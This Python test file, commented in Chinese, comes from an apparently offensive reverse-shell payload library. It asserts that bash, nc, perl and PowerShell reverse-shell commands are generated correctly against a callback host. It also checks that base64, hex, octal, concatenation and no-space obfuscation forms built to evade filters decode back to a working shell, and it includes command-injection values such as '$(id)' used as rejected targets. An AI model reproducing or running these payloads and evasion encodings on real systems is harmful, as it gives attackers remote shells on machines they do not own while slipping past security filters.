"""反弹载荷库：多语法渲染 / 编码可逆性 / 无空格形态 / API 契约。

断言方式：把生成的命令按「目标侧真实解析顺序」反推——
base64/hex/八进制形态先解码回核心命令再比对，确保编码不是装饰而是可还原。
"""

from __future__ import annotations

import base64
import binascii
import re

import pytest

from pivothub.service import reverse_payloads as rp

IP, PORT = "10.8.0.14", 4444
CORE = f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"


def _core_of(cmd: str) -> str:
    """从包装里取回核心命令：nohup <shell> -c '<core>' >/dev/null 2>&1 &"""
    m = re.match(r"^nohup (?:bash|sh) -c '(.*)' >/dev/null 2>&1 &$", cmd, re.S)
    assert m, f"不是预期的后台包装形态: {cmd!r}"
    return m.group(1)


# ---------------- 基础渲染 ----------------

def test_bash_tcp_uses_explicit_bash():
    """dash 环境下 `>&` 报 Bad fd number：经典载荷必须显式 bash -c 包裹。"""
    out = rp.render("bash-tcp", IP, PORT)["cmd"]
    assert out.startswith("nohup bash -c '")
    assert _core_of(out) == CORE
    assert out.endswith(">/dev/null 2>&1 &")


def test_all_linux_specs_render_and_wrap():
    for spec in rp.all_specs():
        if spec.platform != "linux":
            continue
        out = rp.render(spec.id, IP, PORT)["cmd"]
        assert out.strip(), spec.id
        if spec.ctx in ("sh", "bash"):
            assert out.startswith(f"nohup {spec.ctx} -c '"), spec.id
            assert IP in out and str(PORT) in out
        else:  # argv 语境：不下发 nohup，由执行器直接拉起
            assert out.startswith("bash -c"), spec.id


def test_render_rejects_bad_target():
    for ip, port in (("", 4444), ("1.2.3.4;reboot", 4444), ("1.2.3.4", 0),
                     ("1.2.3.4", 70000), ("$(id)", 4444)):
        with pytest.raises(Exception):
            rp.render("bash-tcp", ip, port)


def test_unknown_ids_and_incompatible_encoder():
    with pytest.raises(Exception):
        rp.render("nope", IP, PORT)
    with pytest.raises(Exception):
        rp.render("bash-tcp", IP, PORT, "no-such-encoder")
    # ps 语境不接受 Base64 编码（那是 Linux shell 形态）
    with pytest.raises(Exception):
        rp.render("ps-tcp", IP, PORT, "base64")


# ---------------- 编码可逆性（编码后必须能还原出核心命令） ----------------

def _decoded(cmd: str) -> str:
    """按编码形态反推核心命令（模拟目标侧解码）。"""
    inner = _core_of(cmd)
    if inner.startswith("echo ") and "|base64 -d|bash" in inner:
        return base64.b64decode(inner[5:].split("|")[0]).decode()
    if inner.startswith("perl "):
        b64 = re.search(r'decode_base64\("([^"]+)"\)', inner).group(1)
        return base64.b64decode(b64).decode()
    if inner.startswith("echo ") and "openssl base64 -d -A" in inner:
        return base64.b64decode(inner[5:].split("|")[0]).decode()
    if inner.startswith("echo ") and "|xxd -r -p|" in inner:
        return binascii.unhexlify(inner[5:].split("|")[0]).decode()
    if inner.startswith("printf '"):
        octs = re.findall(r"\\(\d{3})", inner)
        return bytes(int(o, 8) for o in octs).decode()
    if inner.startswith("a=") and "$a$b$c" in inner:
        parts = dict(p.split("=", 1) for p in inner.split(";")[:3])
        return base64.b64decode(parts["a"] + parts["b"] + parts["c"]).decode()
    if "/tmp/.ph" in inner and "|base64 -d>" in inner:
        b64 = inner.split("echo ", 1)[1].split("|base64 -d>")[0]
        return base64.b64decode(b64).decode()
    raise AssertionError(f"未覆盖的编码形态: {inner!r}")


@pytest.mark.parametrize("encode", ["base64", "base64-perl", "base64-openssl", "hex",
                                    "octal", "concat", "tmpfile"])
def test_encoders_roundtrip_to_core(encode):
    out = rp.render("bash-tcp", IP, PORT, encode)["cmd"]
    assert _decoded(out) == CORE


def test_octal_rejects_percent_payload():
    """printf 格式串语义：载荷含 % 时如实拒绝，而不是生成坏命令。"""
    with pytest.raises(Exception):
        rp._apply_encoder("octal", 'awk \'BEGIN{printf "%s"}\'', rp.get_spec("gawk"))


# ---------------- 无空格 / 抗过滤形态 ----------------

def test_ansic_and_nospace_have_no_space_in_script_token():
    """Java exec(String) 按空格切词：脚本 token 里不能有空格，空格只能以 \\x20 出现。"""
    ansic = rp.render("bash-tcp", IP, PORT, "ansic")["cmd"]
    # 先还原包装层的 '\'' 转义，再取 ANSI-C 串本身
    unwrapped = _core_of(ansic).replace("'\\''", "'")
    token = re.search(r"\$'([^']*)'", unwrapped).group(1)
    assert " " not in token and r"\x20" in token
    nospace = rp.render("bash-tcp", IP, PORT, "nospace")["cmd"]
    assert nospace.count(" ") == 2  # 仅 `bash -c` 两处
    assert " " not in nospace.split("-c ", 1)[1]
    # 花括号展开后 base64 还原出核心命令
    b64 = re.search(r"\{echo,([A-Za-z0-9+/=]+)\}", nospace).group(1)
    assert base64.b64decode(b64).decode() == CORE


def test_no_ifs_encoder_shipped():
    """${IFS} 形态经真机验证不可用（重定向目标会被吃成文件名）→ 库中不提供该编码。"""
    assert "ifs" not in {e.key for e in rp.ENCODERS}
    with pytest.raises(Exception):
        rp.render("bash-tcp", IP, PORT, "ifs")


def test_availability_marking_uses_probed_tools():
    cat = rp.catalog(IP, PORT, "linux", tools={"bash", "sh", "nc"})
    by_id = {i["id"]: i for i in cat["items"]}
    assert by_id["bash-tcp"]["available"] is True
    assert by_id["python3"]["available"] is False
    assert by_id["python3"]["missing"] == ["python3"]
    # 不传工具集 → 不做可用性断言（unknown，不误报不可用）
    cat2 = rp.catalog(IP, PORT, "linux")
    assert cat2["items"][0]["available"] is True


def test_catalog_groups_and_platform_filter():
    cat = rp.catalog(IP, PORT, "linux")
    assert [g["key"] for g in cat["groups"]][0] == "linux-shell"
    assert all(i["platform"] == "linux" for i in cat["items"])
    win = rp.catalog(IP, PORT, "windows")
    assert {i["id"] for i in win["items"]} >= {"ps-tcp", "ps-enc"}
    assert cat["probeCmd"].startswith("for c in ")


def test_ps_encoded_command_roundtrip():
    out = rp.render("ps-enc", IP, PORT)["cmd"]
    b64 = out.split("-EncodedCommand ", 1)[1]
    script = base64.b64decode(b64).decode("utf-16-le")
    assert f"TCPClient('{IP}',{PORT})" in script
    assert "-EncodedCommand" in out and "-c \"" not in out


# ---------------- API 契约 ----------------

def test_api_catalog_and_render(client):
    r = client.get(f"/api/shells/reverse/payloads?ip={IP}&port={PORT}&platform=linux"
                   f"&tools=bash,nc,perl")
    assert r.status_code == 200
    data = r.json()
    assert data["ok"] is True and data["ready"] is True
    assert data["groups"] and data["encoders"]
    ids = {i["id"] for i in data["items"]}
    assert {"bash-tcp", "nc-fifo", "perl"} <= ids
    assert next(i for i in data["items"] if i["id"] == "socat")["available"] is False

    r2 = client.get(f"/api/shells/reverse/payload?id=bash-tcp&encode=base64"
                    f"&ip={IP}&port={PORT}")
    assert r2.status_code == 200
    out = r2.json()
    assert out["ok"] is True and out["encode"] == "base64"
    assert base64.b64decode(_core_of(out["cmd"])[5:].split("|")[0]).decode() == CORE


def test_api_render_error_is_honest(client):
    r = client.get("/api/shells/reverse/payload?id=bash-tcp&ip=&port=4444")
    assert r.status_code == 200
    out = r.json()
    assert out["ok"] is False and "回连地址" in out["error"]
    r2 = client.get(f"/api/shells/reverse/payload?id=ps-tcp&encode=hex&ip={IP}&port={PORT}")
    assert r2.json()["ok"] is False
